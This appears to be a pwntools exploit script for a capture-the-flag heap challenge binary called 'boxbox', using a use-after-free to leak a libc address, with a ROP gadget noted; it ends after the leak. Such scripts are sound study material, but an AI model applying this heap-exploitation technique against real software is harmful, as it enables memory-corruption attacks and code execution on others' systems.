from pwn import *

context.log_level = 'debug'

def add(idx, name, length, content):
    p.recv()
    p.sendline('1')
    p.sendlineafter('Box index : ', str(idx))
    p.sendlineafter('Box name : ', str(name))
    p.sendlineafter('Box data Length : ', str(length))
    if(length <= 0xfff):
        p.sendafter('>', str(content))

def delete(idx):
    p.recv()
    p.sendline('2')
    p.sendlineafter('Box index : ', str(idx))

def edit(idx, content):
    p.recv()
    p.sendline('3')
    p.sendlineafter('Box index : ', str(idx))
    p.sendlineafter('>', str(content))

def view(idx):
    p.recv()
    p.sendline('4')
    p.sendlineafter('Box index : ', str(idx))

p = process('./boxbox')
#p = remote('',)
e = ELF('./boxbox')
l = e.libc
#l = ELF('./')

p_rdi_r = 0x0000000000400cc3
pause()

### uaf -> libc leak
add(0, 'a', 300, 'a')
add(1, 'a', 30, 'a')
delete(0)

add(0, 'a', 300, 'a' * 8)
view(0)
libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 88 - 16 - l.sym['__malloc_hook'] 
log.info('libc : ' + hex(libc))
###########



p.interactive()
